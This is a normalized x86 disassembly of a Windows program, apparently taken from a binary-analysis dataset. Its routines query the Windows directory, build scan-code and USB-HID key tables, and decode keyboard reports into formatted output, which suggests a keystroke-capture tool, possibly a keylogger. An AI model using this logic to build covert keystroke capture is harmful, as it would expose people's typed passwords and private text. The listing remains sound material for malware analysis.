sub_401038
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add al [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add ah cl
int3
sub_4010b0
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push ebx
push esi
push edi
mov edi edx
mov eax ecx
mov [ esp + 0xc ] edi
lea esi [ eax + 0x1 ]
mov dl [ eax ]
add eax 0x1
test dl dl
jne r-xdata
mov edx [ r--data ]
sub eax esi
mov ebx eax
mov eax [ r--data ]
mov [ esp + 0x10 ] eax
mov ax [ r--data ]
xor esi esi
test ebx ebx
mov [ esp + 0x14 ] edx
mov [ esp + 0x18 ] ax
jle r-xdata
mov ecx [ esp + 0x90 ]
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebx
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub edi ecx
push ebp
mov [ edi + ecx ] al
add esi 0x1
add ecx 0x1
cmp esi ebx
jl r-xdata
xor al dl
mov eax esi
cdq
mov ebp 0x9
idiv ebp
mov al [ ecx ]
mov dl [ esp + edx + 0x14 ]
cmp al dl
je r-xdata
mov ecx [ esp + 0x10 ]
pop ebp
pop edi
mov [ ecx + esi ] 0x0
pop esi
pop ebx
mov ecx [ esp + 0x84 ]
xor ecx esp
call sub_40f589
add esp 0x88
retn
sub_401170
sub esp 0x28c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x284 ] eax
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
mov [ esp + 0x128 ] eax
mov [ esp + 0x12c ] eax
mov [ esp + 0x130 ] eax
mov [ esp + 0x134 ] eax
mov [ esp + 0x138 ] eax
mov [ esp + 0x13c ] eax
push 0x32
lea eax [ esp + 0x254 ]
push eax
call [ GetWindowsDirectoryA@IAT ]
lea ecx [ esp + 0x128 ]
push ecx
lea edx [ esp + 0x254 ]
push edx
call sub_406701
lea eax [ esp ]
push eax
push esi
call sub_406701
test eax eax
je r-xdata
mov ecx [ esp + 0x284 ]
xor ecx esp
call sub_40f589
add esp 0x28c
retn
mov ecx [ esp + 0x12c ]
mov eax [ esp + 0x128 ]
mov [ esp + 0x4 ] ecx
mov [ esp + 0xc ] ecx
mov [ esp + 0x14 ] ecx
lea ecx [ esp ]
push ecx
push esi
mov [ esp + 0x8 ] eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x18 ] eax
call sub_4068f5
sub_401240
push 0xffffffff
push sub_4211d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x130
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x12c ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x138 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esp + 0xc ]
call sub_405c91
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] 0x0
call sub_405c91
push esi
lea eax [ esp + 0x30 ]
push r--data
push eax
mov [ esp + 0x14c ] 0x1
call sub_40f598
add esp 0xc
push 0x0
push 0x1001
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_4062a3
test eax eax
jne r-xdata
push 0x397
push rw-data
lea ecx [ esp + 0x14 ]
call sub_40585b
lea ecx [ esp + 0xc ]
call sub_405be7
lea esi [ esp + 0x2c ]
call sub_401170
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] 0x0
call sub_405f18
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0xffffffff
call sub_405f18
mov eax 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] al
call sub_405f18
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0xffffffff
call sub_405f18
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x138 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x12c ]
xor ecx esp
call sub_40f589
add esp 0x13c
retn
sub_401370
push 0xffffffff
push sub_4211d6
mov eax [ fs : 0x0 ]
push eax
sub esp 0x130
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x12c ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x138 ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esp + 0xc ]
call sub_405c91
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] 0x0
call sub_405c91
push esi
lea eax [ esp + 0x30 ]
push r--data
push eax
mov [ esp + 0x14c ] 0x1
call sub_40f598
add esp 0xc
push 0x0
push 0x1001
lea ecx [ esp + 0x34 ]
push ecx
lea ecx [ esp + 0x18 ]
call sub_4062a3
test eax eax
jne r-xdata
push 0x49b00
push rw-data
lea ecx [ esp + 0x14 ]
call sub_40585b
lea ecx [ esp + 0xc ]
call sub_405be7
lea esi [ esp + 0x2c ]
call sub_401170
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] 0x0
call sub_405f18
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0xffffffff
call sub_405f18
mov eax 0x1
lea ecx [ esp + 0x1c ]
mov [ esp + 0x140 ] al
call sub_405f18
lea ecx [ esp + 0xc ]
mov [ esp + 0x140 ] 0xffffffff
call sub_405f18
xor eax eax
jmp r-xdata
mov ecx [ esp + 0x138 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x12c ]
xor ecx esp
call sub_40f589
add esp 0x13c
retn
sub_4014a0
sub esp 0x10c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x108 ] eax
mov cl [ rw-data ]
test cl cl
mov al [ esp + 0x110 ]
push ebp
push esi
push edi
jne r-xdata
cmp cl 0xe0
jne r-xdata
cmp al 0xe0
jne r-xdata
cmp cl 0xe1
jne r-xdata
xor edi edi
movzx ebp al
mov esi rw-data
lea ecx [ ecx ]
cmp al 0xe1
jne r-xdata
mov [ rw-data ] al
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_40f589
add esp 0x10c
retn
movzx ebp al
push 0x3
push ebp
call [ MapVirtualKeyA@IAT ]
xor edi edi
mov esi rw-data
mov cl [ rw-data ]
test cl cl
jne r-xdata
add esi 0x20
add edi 0x1
cmp esi rw-data
jl r-xdata
push edi
push ebp
push esi
lea eax [ esp + 0x1c ]
push r--data
push eax
call sub_40f598
add esp 0x14
push 0x0
lea ecx [ esp + 0x14 ]
push 0x1
push ecx
call sub_4041d0
add esp 0xc
mov [ rw-data ] al
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_40f589
add esp 0x10c
retn
add esi 0x20
add edi 0x1
cmp esi rw-data
jl r-xdata
push edi
push ebp
push esi
lea ecx [ esp + 0x1c ]
push r--data
push ecx
call sub_40f598
add esp 0x14
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
cmp cl 0x1d
jne r-xdata
mov [ rw-data ] al
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_40f589
add esp 0x10c
retn
cmp [ esi + 0x14 ] ebp
jne r-xdata
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_40f589
add esp 0x10c
retn
cmp [ esi + 0x14 ] ebp
jne r-xdata
mov ecx [ esp + 0x114 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_40f589
add esp 0x10c
retn
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
pop edi
pop esi
pop ebp
mov ecx [ esp + 0x108 ]
xor ecx esp
call sub_40f589
add esp 0x10c
retn
cmp al 0x45
jne r-xdata
lea edx [ esp + 0x10 ]
push r--data
push edx
call sub_40f598
push 0x0
lea eax [ esp + 0x1c ]
push 0x1
push eax
call sub_4041d0
add esp 0x14
sub_401660
cmp ecx 0x3
jne r-xdata
xor eax eax
test ecx ecx
jle r-xdata
mov eax 0x1
lea ebx [ ebx ]
mov eax 0x1
retn
lea ecx [ ecx ]
xor eax eax
retn
add eax 0x1
cmp eax 0x3
jl r-xdata
add eax 0x1
cmp eax ecx
jl r-xdata
cmp [ eax + edx ] 0x0
ja r-xdata
mov eax 0x1
retn
cmp [ eax + edx ] 0x0
ja r-xdata
sub_4016b0
mov edx [ esp + 0x4 ]
xor ecx ecx
mov eax rw-data
jmp r-xdata
cmp [ eax ] edx
je r-xdata
lea eax [ ecx + 0x1 ]
retn
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
xor eax eax
retn
sub_401700
sub esp 0x10c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x104 ] eax
mov eax [ esp + 0x110 ]
cmp eax 0x8
push ebx
push ebp
mov ebp [ esp + 0x11c ]
push esi
push edi
jne r-xdata
cmp eax 0x3
jne r-xdata
cmp [ ebp + 0x2 ] 0x1
lea esi [ ebp + 0x2 ]
jne r-xdata
mov ecx [ esp + 0x114 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_40f589
add esp 0x10c
retn
mov bl [ ebp + 0x1 ]
cmp bl 0x1
lea esi [ ebp + 0x1 ]
jne r-xdata
xor eax eax
cmp [ ebp + 0x3 ] 0x1
jne r-xdata
mov edx ebp
mov ecx 0x3
call sub_401660
cmp eax 0x1
je r-xdata
cmp [ ebp + 0x2 ] bl
je r-xdata
test [ rw-data ] 0x1
jne r-xdata
add eax 0x1
cmp eax 0x8
jl r-xdata
cmp [ ebp + 0x4 ] 0x1
je r-xdata
mov ecx ebp
xor eax eax
sub ecx rw-data
jmp r-xdata
mov edx rw-data
call sub_401660
cmp eax 0x1
jne r-xdata
test [ rw-data ] 0x4
jne r-xdata
mov al [ ebp ]
test al 0x1
je r-xdata
cmp [ eax + rw-data ] 0x0
ja r-xdata
mov al [ ebp ]
test al 0x1
je r-xdata
jmp r-xdata
mov dl [ eax + ecx + rw-data ]
mov [ eax + rw-data ] dl
add eax 0x1
cmp eax 0x3
jl r-xdata
xor edi edi
mov al [ ebp + 0x2 ]
test al al
jne r-xdata
test [ rw-data ] 0x2
jne r-xdata
mov al [ ebp ]
test al 0x4
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x4
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
add edi 0x1
cmp edi 0x2
jl r-xdata
xor eax eax
cmp al 0x1
mov [ rw-data ] al
jne r-xdata
mov edi 0x2
jmp r-xdata
test [ rw-data ] 0x8
jne r-xdata
mov al [ ebp ]
test al 0x2
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x2
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
movzx edx [ esi + edi ]
test edx edx
jbe r-xdata
xor edx edx
add eax 0x1
cmp eax 0x2
jl r-xdata
cmp al 0x2
jne r-xdata
movzx eax bl
sub eax 0x8a
je r-xdata
mov al [ esi ]
test al al
jbe r-xdata
test [ rw-data ] 0x10
jne r-xdata
mov al [ ebp ]
test al 0x8
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x8
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
add edx 0x1
cmp edx 0x2
jl r-xdata
xor eax eax
movzx ecx [ eax + rw-data ]
cmp ecx edx
je r-xdata
xor ecx ecx
mov eax rw-data
jmp r-xdata
movzx eax bl
lea ecx [ eax - 0x21 ]
cmp ecx 0x9
ja r-xdata
push 0x1
push 0x8a
push r--data
jmp r-xdata
sub eax 0x8
je r-xdata
add esi 0x1
sub edi 0x1
jne r-xdata
mov ecx sub_4016b0
test ecx ecx
jbe r-xdata
test [ rw-data ] 0x40
jne r-xdata
mov al [ ebp ]
test al 0x10
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x10
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
movzx ecx [ edx + rw-data ]
test ecx ecx
jbe r-xdata
add eax 0x1
cmp eax 0x2
jl r-xdata
cmp [ eax ] edx
je r-xdata
jmp [ ecx * 4 + jump_table_401ee8 ]
lea eax [ esp + 0x1c ]
push eax
call sub_40f598
push 0x0
lea ecx [ esp + 0x24 ]
push 0x1
push ecx
call sub_4041d0
add esp 0x1c
jmp r-xdata
push 0x1
push 0x92
push r--data
jmp r-xdata
sub eax 0x2
jne r-xdata
jmp r-xdata
movzx edx al
call sub_4016e0
movzx edx [ esi + 0x1 ]
sub eax 0x1
push eax
shl eax 0x5
push edx
add eax rw-data
push eax
lea eax [ esp + 0x1c ]
push r--data
push eax
call sub_40f598
add esp 0x14
push 0x0
lea ecx [ esp + 0x14 ]
push 0x1
push ecx
call sub_4041d0
add esp 0xc
test [ rw-data ] 0x20
jne r-xdata
mov al [ ebp ]
test al 0x40
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x40
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
movzx edi [ esi + eax ]
cmp edi ecx
je r-xdata
mov eax rw-data
lea eax [ ecx + 0x1 ]
jmp r-xdata
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
push 0x2
push eax
push r--data
jmp r-xdata
push 0x2
push eax
push r--data
push 0x2
push eax
push r--data
push 0x2
push eax
push r--data
jmp r-xdata
push 0x2
push eax
push r--data
jmp r-xdata
push 0x2
push eax
push r--data
jmp r-xdata
push 0x2
push eax
push r--data
lea ecx [ esp + 0x1c ]
push ecx
call sub_40f598
push 0x0
lea edx [ esp + 0x24 ]
push 0x1
push edx
call sub_4041d0
add esp 0x1c
jmp r-xdata
push 0x1
push 0x94
push r--data
jmp r-xdata
test [ rw-data ] 0x80
jne r-xdata
mov al [ ebp ]
test al 0x20
je r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al 0x20
je r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
add eax 0x20
cmp eax rw-data
jl r-xdata
mov edx sub_4016b0
test edx edx
jbe r-xdata
xor eax eax
lea edx [ esp + 0x1c ]
push edx
call sub_40f598
push 0x0
lea eax [ esp + 0x24 ]
push 0x1
push eax
call sub_4041d0
add esp 0x1c
jmp r-xdata
mov edi 0x4
jmp r-xdata
mov al [ ebp ]
test al al
jns r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov al [ ebp ]
test al al
jns r-xdata
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
cmp [ eax ] ecx
je r-xdata
movzx ecx [ edi + ebp + 0x2 ]
sub eax 0x1
push eax
push ecx
shl eax 0x5
add eax rw-data
push eax
lea edx [ esp + 0x1c ]
push r--data
push edx
call sub_40f598
add esp 0x14
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
movzx edx [ esi ]
test edx edx
jbe r-xdata
movzx ecx al
push ecx
lea edx [ esp + 0x14 ]
push r--data
push edx
call sub_40f598
add esp 0xc
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
mov edi 0x4
lea esp [ esp ]
movzx eax al
push eax
lea ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_40f598
add esp 0xc
push 0x0
lea edx [ esp + 0x14 ]
push 0x1
push edx
call sub_4041d0
add esp 0xc
add esi 0x1
sub edi 0x1
jne r-xdata
xor eax eax
lea esp [ esp ]
add esi 0x1
sub edi 0x1
jne r-xdata
movzx edx al
xor ecx ecx
mov eax rw-data
mov ecx ebp
xor eax eax
sub ecx rw-data
jmp r-xdata
add eax 0x1
cmp eax 0x3
jl r-xdata
mov al [ esi ]
test al al
jbe r-xdata
jmp r-xdata
lea eax [ ecx + 0x1 ]
test eax eax
jle r-xdata
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
mov dl [ eax + ecx + rw-data ]
mov [ eax + rw-data ] dl
add eax 0x1
cmp eax 0x8
jl r-xdata
movzx ecx [ eax + rw-data ]
cmp ecx edx
je r-xdata
xor ecx ecx
mov eax rw-data
lea ebx [ ebx ]
xor ecx ecx
mov eax rw-data
lea esp [ esp ]
sub eax 0x1
push eax
shl eax 0x5
push edx
add eax rw-data
push eax
lea eax [ esp + 0x1c ]
push r--data
push eax
call sub_40f598
add esp 0x14
push 0x0
push 0x1
lea ecx [ esp + 0x18 ]
push ecx
jmp r-xdata
cmp [ eax ] edx
je r-xdata
jmp r-xdata
lea eax [ ecx + 0x1 ]
test eax eax
jle r-xdata
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
lea eax [ ecx + 0x1 ]
test eax eax
jle r-xdata
add eax 0x20
add ecx 0x1
cmp eax rw-data
jl r-xdata
call sub_4041d0
add esp 0xc
sub eax 0x1
push eax
push edx
shl eax 0x5
add eax rw-data
push eax
lea edx [ esp + 0x1c ]
push r--data
push edx
call sub_40f598
add esp 0x14
push 0x0
lea eax [ esp + 0x14 ]
push 0x1
push eax
call sub_4041d0
add esp 0xc
cmp [ eax ] edx
je r-xdata
jmp r-xdata
sub eax 0x1
push eax
push edx
shl eax 0x5
add eax rw-data
push eax
lea edx [ esp + 0x1c ]
push r--data
push edx
call sub_40f598
add esp 0x14
push 0x0
push 0x1
lea eax [ esp + 0x18 ]
push eax
cmp [ eax ] edx
je r-xdata
jmp r-xdata
sub_401f10
push ebx
push ebp
push esi
push edi
push 0x1900
push 0x0
push rw-data
call sub_4109d0
mov eax 0x12
mov [ rw-data ] eax
mov ecx 0x10
mov [ rw-data ] eax
mov edx 0x11
mov ebp 0x18
mov ebx 0x19
mov eax 0x13
add esp 0xc
mov [ rw-data ] 0x61
mov [ rw-data ] 0x1e
mov [ rw-data ] 0x9e
mov [ rw-data ] 0x4
mov [ rw-data ] 0x62
mov [ rw-data ] 0x30
mov [ rw-data ] 0xb0
mov [ rw-data ] 0x5
mov [ rw-data ] 0x63
mov [ rw-data ] 0x2e
mov [ rw-data ] 0xae
mov [ rw-data ] 0x6
mov [ rw-data ] 0x64
mov [ rw-data ] 0x20
mov [ rw-data ] 0xa0
mov [ rw-data ] 0x7
mov [ rw-data ] 0x65
mov [ rw-data ] 0x92
mov [ rw-data ] 0x8
mov [ rw-data ] 0x66
mov [ rw-data ] 0x21
mov [ rw-data ] 0xa1
mov [ rw-data ] 0x9
mov [ rw-data ] 0x67
mov [ rw-data ] 0x22
mov [ rw-data ] 0xa2
mov [ rw-data ] 0xa
mov [ rw-data ] 0x68
mov [ rw-data ] 0x23
mov [ rw-data ] 0xa3
mov [ rw-data ] 0xb
mov [ rw-data ] 0x69
mov [ rw-data ] 0x17
mov [ rw-data ] 0x97
mov [ rw-data ] 0xc
mov [ rw-data ] 0x6a
mov [ rw-data ] 0x24
mov [ rw-data ] 0xa4
mov [ rw-data ] 0xd
mov [ rw-data ] 0x6b
mov [ rw-data ] 0x25
mov [ rw-data ] 0xa5
mov [ rw-data ] 0xe
mov [ rw-data ] 0x4c
mov [ rw-data ] 0x26
mov [ rw-data ] 0xa6
mov [ rw-data ] 0xf
mov [ rw-data ] 0x6d
mov [ rw-data ] 0x32
mov [ rw-data ] 0xb2
mov [ rw-data ] ecx
mov [ rw-data ] 0x6e
mov [ rw-data ] 0x31
mov [ rw-data ] 0xb1
mov [ rw-data ] edx
mov [ rw-data ] 0x6f
mov [ rw-data ] ebp
mov [ rw-data ] 0x98
mov [ rw-data ] 0x70
mov [ rw-data ] ebx
mov [ rw-data ] 0x99
mov [ rw-data ] eax
mov [ rw-data ] 0x71
mov [ rw-data ] ecx
mov ecx 0x14
mov edi 0x15
mov esi 0x1f
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov [ rw-data ] edi
mov [ rw-data ] esi
mov eax 0x16
mov [ rw-data ] ecx
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] edi
mov [ rw-data ] esi
mov ecx 0x2d
mov ebx 0x36
mov ebp 0x37
mov edi 0x38
mov esi 0x39
mov [ rw-data ] 0x90
mov [ rw-data ] 0x72
mov [ rw-data ] 0x93
mov [ rw-data ] 0x73
mov [ rw-data ] 0x9f
mov [ rw-data ] eax
mov [ rw-data ] 0x74
mov [ rw-data ] 0x94
mov [ rw-data ] 0x17
mov [ rw-data ] 0x75
mov [ rw-data ] eax
mov [ rw-data ] 0x96
mov [ rw-data ] 0x76
mov [ rw-data ] 0x2f
mov [ rw-data ] 0xaf
mov [ rw-data ] 0x77
mov [ rw-data ] edx
mov [ rw-data ] 0x91
mov [ rw-data ] 0x1a
mov [ rw-data ] 0x78
mov [ rw-data ] ecx
mov [ rw-data ] 0xad
mov [ rw-data ] 0x1b
mov [ rw-data ] 0x79
mov [ rw-data ] 0x95
mov [ rw-data ] 0x1c
mov [ rw-data ] 0x7a
mov [ rw-data ] 0x2c
mov [ rw-data ] 0xac
mov [ rw-data ] 0x1d
mov [ rw-data ] 0x31
mov [ rw-data ] 0x2
mov [ rw-data ] 0x82
mov [ rw-data ] 0x1e
mov [ rw-data ] 0x32
mov [ rw-data ] 0x3
mov [ rw-data ] 0x83
mov [ rw-data ] 0x33
mov [ rw-data ] 0x4
mov [ rw-data ] 0x84
mov [ rw-data ] 0x20
mov [ rw-data ] 0x34
mov [ rw-data ] 0x5
mov [ rw-data ] 0x85
mov [ rw-data ] 0x21
mov [ rw-data ] 0x35
mov [ rw-data ] 0x6
mov [ rw-data ] 0x86
mov [ rw-data ] 0x22
mov [ rw-data ] bx
mov [ rw-data ] 0x7
mov [ rw-data ] 0x87
mov [ rw-data ] 0x23
mov [ rw-data ] bp
mov [ rw-data ] 0x8
mov [ rw-data ] 0x88
mov [ rw-data ] 0x24
mov [ rw-data ] di
mov [ rw-data ] 0x9
mov [ rw-data ] 0x89
mov [ rw-data ] 0x25
mov [ rw-data ] si
mov [ rw-data ] 0xa
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov [ rw-data ] ax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
movzx eax [ r--data ]
mov edx 0x27
mov [ rw-data ] ax
mov eax 0x2b
mov [ rw-data ] edx
mov [ rw-data ] eax
mov [ rw-data ] cx
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov [ rw-data ] edx
mov [ rw-data ] dx
mov ecx 0x3d
mov eax 0x3b
mov edx 0x34
mov [ rw-data ] 0x8a
mov [ rw-data ] 0x26
mov [ rw-data ] 0x30
mov [ rw-data ] 0xb
mov [ rw-data ] 0x8b
mov [ rw-data ] 0x1c
mov [ rw-data ] 0x9c
mov [ rw-data ] 0x28
mov [ rw-data ] 0x1
mov [ rw-data ] 0x81
mov [ rw-data ] 0x29
mov [ rw-data ] 0xe
mov [ rw-data ] 0x8e
mov [ rw-data ] 0x2a
mov [ rw-data ] 0xf
mov [ rw-data ] 0x8f
mov [ rw-data ] 0x20
mov [ rw-data ] esi
mov [ rw-data ] 0xb9
mov [ rw-data ] 0x2c
mov [ rw-data ] 0xc
mov [ rw-data ] 0x8c
mov [ rw-data ] cx
mov [ rw-data ] 0xd
mov [ rw-data ] 0x8d
mov [ rw-data ] 0x2e
mov [ rw-data ] 0x5b
mov [ rw-data ] 0x1a
mov [ rw-data ] 0x9a
mov [ rw-data ] 0x2f
mov [ rw-data ] 0x5d
mov [ rw-data ] 0x1b
mov [ rw-data ] 0x9b
mov [ rw-data ] 0x30
mov [ rw-data ] 0x5c
mov [ rw-data ] 0xab
mov [ rw-data ] 0x31
mov [ rw-data ] ax
mov [ rw-data ] 0xa7
mov [ rw-data ] 0x33
mov [ rw-data ] 0x28
mov [ rw-data ] 0xa8
mov [ rw-data ] edx
mov [ rw-data ] 0x60
mov [ rw-data ] 0x29
mov [ rw-data ] 0xa9
mov [ rw-data ] 0x35
mov [ rw-data ] 0x2c
mov [ rw-data ] 0x33
mov [ rw-data ] 0xb3
mov [ rw-data ] ebx
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dl
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] ecx
mov [ rw-data ] ecx
movzx ecx [ r--data ]
mov [ rw-data ] eax
mov eax [ r--data ]
mov [ rw-data ] dl
mov [ rw-data ] cl
movzx ecx [ r--data ]
mov edx 0x3e
mov [ rw-data ] eax
mov eax 0x3f
mov [ rw-data ] edx
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] eax
mov [ rw-data ] cl
mov [ rw-data ] eax
mov al [ r--data ]
mov ecx 0x40
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] ecx
mov [ rw-data ] al
mov eax 0x41
mov [ rw-data ] ecx
mov ecx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] esi
mov esi 0x3c
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] eax
mov eax [ r--data ]
mov ecx 0x42
mov [ rw-data ] 0x2e
mov [ rw-data ] 0xb4
mov [ rw-data ] ebp
mov [ rw-data ] 0x2f
mov [ rw-data ] 0x35
mov [ rw-data ] 0xb5
mov [ rw-data ] edi
mov [ rw-data ] 0x3a
mov [ rw-data ] 0xba
mov [ rw-data ] 0xbb
mov [ rw-data ] 0x3a
mov [ rw-data ] esi
mov [ rw-data ] 0xbc
mov [ rw-data ] 0xbd
mov [ rw-data ] esi
mov [ rw-data ] 0xbe
mov [ rw-data ] 0xbf
mov [ rw-data ] 0xc0
mov [ rw-data ] 0xc1
mov [ rw-data ] dl
mov [ rw-data ] ecx
mov [ rw-data ] 0xc2
mov [ rw-data ] eax
movzx edx [ r--data ]
mov [ rw-data ] dl
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
mov edx [ r--data ]
mov [ rw-data ] edx
mov edx [ r--data ]
mov [ rw-data ] edx
movzx edx [ r--data ]
mov [ rw-data ] dx
movzx edx [ r--data ]
